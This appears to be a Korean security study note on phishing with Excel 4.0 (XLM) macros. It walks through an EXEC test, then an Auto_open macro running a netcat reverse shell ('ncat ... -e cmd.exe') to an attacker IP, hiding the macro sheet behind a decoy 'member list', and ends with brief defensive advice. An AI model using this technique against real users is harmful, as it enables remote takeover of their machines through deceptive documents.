# XLM Excel 4.0 매크로

XLM (Excel 4.0) 매크로를 사용한 피싱 탬플랫 기법은 매우 전통적이고 유래가 깊은(?) 공격 탬플릿  기법이다. 이 기법을 사용한 공격은 주로 악성코드를 포함한 문서 파일을 이메일 첨부파일이나 링크를 통해 유포하는 사이버 범죄자나 해커들이 초기 침투 방식으로 사용하는 탬플릿 중 하나이기도 하다.

다행스럽게도, 최근 버전의 Microsoft Office에서는 VBA 매크로 실행을 디폴트로 비활성화하게 되어있고, XLM (Excel 4.0) 매크로를 사용한 공격 기법은 1990년대에 개발된 굉장히 오래된 기술이며 안 기술의 발전으로 인해 많이 찾지 않는 공격 기법이다. 따라서, 최근에는 XLM 매크로를 사용하는 공격이 VBA 매크로를 사용하는 공격보다는 정식 파일에 chm,lnk,hta등을 심어 사용하는 기법이 주로 쓰인다.

하지만 혹시라도 매크로 공격에 취약한 Excel 4.0과 5.0버전을 아직까지도 쓴다거나 블랙 해커가가 화려한언변과 소셜 엔지니어링을 통해 타겟 유저가 스스로 매크로 활성을 하게 유도한다면 매크로 공격은 쉽고도 정확한 공격 기법이 될수 있다.

## 실습

실습을 위해 File -> Info -> Macro Settings -> Enable VBA Macros...를 선택해 매크로를 활성화해준다.

![](<../../obsidian\_resources/Pasted image 20230502195135.png>)

아래 시트에서 우클릭 -> Insert (추가) -> MS Excel 4.0 Macro -> OK를 해준다.&#x20;

<figure><img src="../../obsidian_resources/Pasted image 20230502193306.png" alt=""><figcaption></figcaption></figure>

간단한 테스트를 위해 아래 같이 각 열에 입력하여 계산기 (calc.exe)와 함께 "HELLO WORLD" 구문이 열리는지 확인해본다.

```
=EXEC("calc.exe")
=ALERT("HELLO WORLD!")
=HALT()
```

성공했다! 이제 우리는 EXCEL의 매크로를 통해 커맨드 EXEC로 앱 실행이 가능하다는 것을 알았다!&#x20;

<figure><img src="../../obsidian_resources/Pasted image 20230502193523.png" alt=""><figcaption></figcaption></figure>

### 실전 예제

실전 예제를 들어보자.

이제 공격자는 타겟이 사용하는 EXCEL 매크로 기능을 통해 로컬 바이너리를 실행할 수 있다라는 사실을 알았다.

그렇다면 공격자는 간단한 netcat 리버스 쉘을 실행하는 백도어를 매크로에 심어 타겟이 공격자에 연결되게끔 할수 있다는 말이다!

shell.cmd 에 \`ncat 192.168.137.131 443 -e cmd.exe 를 저장한다. 공격자에 포트 443로 연결을 시도한다라는 뜻이다.

아래와 같이 shell.cmd를 실행하는 매크로를 생성하고 A1을 Auto\_open으로 바꿔주면 파일이 열림과 동시에 매크로가가 자동으로 실행될게 해줄수 있다.

```
=EXEC("C:\Temp\shell.cmd")
=ALERT("GROOT!")
=HALT()
```

![](<../../obsidian\_resources/Pasted image 20230502195827.png>)

일단 매크로 구문이 들어있는 EXCEL 파일은 누가봐도 수상하기 때문에 Hide (숨기기)를 해주고 정상 파일로 보이게 "회원 명단"과 같은 내용을 넣어준다.&#x20;

<figure><img src="../../obsidian_resources/Pasted image 20230502195849.png" alt=""><figcaption></figcaption></figure>

타겟 유저가 보는 EXCEL 파일에는 매크로 탭은 보이지 않고 "회원 명단"만 보이게 되어 의심을 피할 수 있다.

<figure><img src="../../obsidian_resources/Pasted image 20230504185904.png" alt=""><figcaption></figcaption></figure>

이제 타겟이 EXCEL 파일을 여는 순간 아래와 같이 공격자의 포트 443으로 리버스 쉘이 연결된 것을 알 수 있다!&#x20;

<figure><img src="../../obsidian_resources/화면 캡처 2023-05-02 200259.png" alt=""><figcaption></figcaption></figure>

## 대응방안

XLM (Excel 4.0) 매크로를 사용한 공격 기법에 대응하기 위한 방안은 매크로 공격에 취약한 Excel을 최신 버전으로 패치하는거다. 또한 대부분의 안티바이러스 및 방화벽과 같은 보안 솔루션을 XLM 매크로 실행을 탐지하고 차단할 수 있으니 너무 걱정은 하지 않다도 되지만 그래도

마지막으로, 너무나도 당연하지만 수상한 이메일 첨부 파일이나 다운로드 링크를 클릭하지 않아야 한다. 만약에 매크로를 활성화해야 한다는 IT부서의 권고 이메일을 받게 되면 진짜 IT부서가 맞는지 의심하고 또 의심하길 바란다.

## 레퍼런스

{% embed url="https://en.wikipedia.org/wiki/Microsoft_Excel" %}

{% embed url="https://www.ired.team/offensive-security/initial-access/phishing-with-ms-office/phishing-xlm-macro-4.0" %}

{% embed url="https://outflank.nl/blog/2018/10/06/old-school-evil-excel-4-0-macros-xlm" %}

{% embed url="https://d13ot9o61jdzpp.cloudfront.net/files/Excel%204.0%20Macro%20Functions%20Reference.pdf" %}

